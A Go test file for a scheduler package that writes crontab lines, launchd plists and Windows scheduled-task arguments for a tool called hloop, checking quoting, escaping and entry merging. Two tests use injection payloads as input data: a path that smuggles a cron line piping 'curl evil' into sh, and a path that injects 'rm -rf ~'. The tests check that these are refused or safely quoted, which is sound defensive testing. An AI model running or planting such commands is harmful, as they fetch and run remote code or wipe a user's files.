package sched

import (
	"strings"
	"testing"
)

func TestCronLinesQuoteAndEscape(t *testing.T) {
	s := Spec{Kind: "run", Name: "my app", Root: "/home/me/it's 100%", Exe: "/usr/local/bin/hloop", EveryHours: 6, AtBoot: true}
	lines := CronLines(s)
	if len(lines) != 2 {
		t.Fatalf("want periodic + reboot, got %v", lines)
	}
	if !strings.HasPrefix(lines[0], "0 */6 * * * ") || !strings.HasPrefix(lines[1], "@reboot ") {
		t.Fatalf("schedule fields wrong: %v", lines)
	}
	if !strings.Contains(lines[0], `'/home/me/it'\''s 100\%'`) {
		t.Fatalf("path not shell-quoted / percent-escaped: %s", lines[0])
	}
	for _, l := range lines {
		if !strings.HasSuffix(l, "# hloop:hloop-my app") {
			t.Fatalf("marker missing: %s", l)
		}
	}
}

func TestMergeCrontabReplacesOnlyOwnEntries(t *testing.T) {
	existing := "MAILTO=me\n0 1 * * * backup.sh\n"
	a := Spec{Kind: "run", Name: "a", Root: "/a", Exe: "/bin/hloop", EveryHours: 8}
	b := Spec{Kind: "run", Name: "b", Root: "/b", Exe: "/bin/hloop", EveryHours: 4}
	merged := MergeCrontab(MergeCrontab(existing, a), b)
	if !strings.Contains(merged, "backup.sh") || !strings.Contains(merged, "MAILTO=me") {
		t.Fatalf("foreign entries lost:\n%s", merged)
	}
	if strings.Count(merged, "# hloop:hloop-a") != 1 || strings.Count(merged, "# hloop:hloop-b") != 1 {
		t.Fatalf("each project should appear once:\n%s", merged)
	}
	a.EveryHours = 12
	again := MergeCrontab(merged, a)
	if strings.Count(again, "# hloop:hloop-a") != 1 || !strings.Contains(again, "*/12") || strings.Contains(again, "*/8 ") {
		t.Fatalf("reinstall should replace, not duplicate:\n%s", again)
	}
	removed := RemoveFromCrontab(again, "hloop-a")
	if strings.Contains(removed, "hloop-a") || !strings.Contains(removed, "hloop-b") || !strings.Contains(removed, "backup.sh") {
		t.Fatalf("remove touched the wrong lines:\n%s", removed)
	}
	if RemoveFromCrontab("0 * * * * x # hloop:hloop-z\n", "hloop-z") != "" {
		t.Fatal("removing the last line should give an empty crontab")
	}
}

func TestListenerSpec(t *testing.T) {
	s := Spec{Kind: "listen", Exe: "/bin/hloop"}
	lines := CronLines(s)
	if len(lines) != 1 || !strings.HasPrefix(lines[0], "@reboot ") || !strings.Contains(lines[0], "'notify' 'listen'") {
		t.Fatalf("listener cron: %v", lines)
	}
}

func TestPlistAndSchtasks(t *testing.T) {
	s := Spec{Kind: "run", Name: "demo", Root: `/Users/me/a&b`, Exe: "/usr/local/bin/hloop", EveryHours: 8}
	p := Plist(s)
	for _, want := range []string{"com.hloop.demo", "<integer>28800</integer>", "a&amp;b", "<string>run</string>"} {
		if !strings.Contains(p, want) {
			t.Errorf("plist missing %q:\n%s", want, p)
		}
	}
	if !strings.Contains(Plist(Spec{Kind: "listen", Exe: "/x"}), "<key>KeepAlive</key>") {
		t.Error("listener plist should keep the process alive")
	}
	cmds := SchtasksArgs(Spec{Kind: "run", Name: "demo", Root: `C:\My Projects\demo`, Exe: `C:\Tools\hloop.exe`, EveryHours: 6, AtBoot: true})
	if len(cmds) != 2 {
		t.Fatalf("want hourly + logon tasks, got %v", cmds)
	}
	joined := strings.Join(cmds[0], " ")
	if !strings.Contains(joined, "/SC HOURLY /MO 6") || !strings.Contains(joined, `"C:\My Projects\demo"`) || !strings.Contains(joined, `"C:\Tools\hloop.exe"`) {
		t.Fatalf("schtasks args: %s", joined)
	}
}

func TestInstallRefusesControlCharactersInPaths(t *testing.T) {
	for _, s := range []Spec{
		{Kind: "run", Name: "x", Root: "/tmp/a\n* * * * * curl evil|sh", Exe: "/usr/bin/hloop"},
		{Kind: "run", Name: "x", Root: "/tmp/a", Exe: "/usr/bin/hloop\r"},
	} {
		if _, err := Install(s); err == nil {
			t.Errorf("Install(%+v) should refuse control characters", s)
		}
	}
}

func TestCronCommandQuotesHostilePaths(t *testing.T) {
	s := Spec{Kind: "run", Name: "x", Root: `/tmp/a'; rm -rf ~; echo '100%`, Exe: "/usr/bin/hloop"}
	line := CronLines(s)[0]
	if !strings.Contains(line, `'\''`) || !strings.Contains(line, `100\%`) {
		t.Fatalf("path not safely quoted/escaped in cron line: %s", line)
	}
}
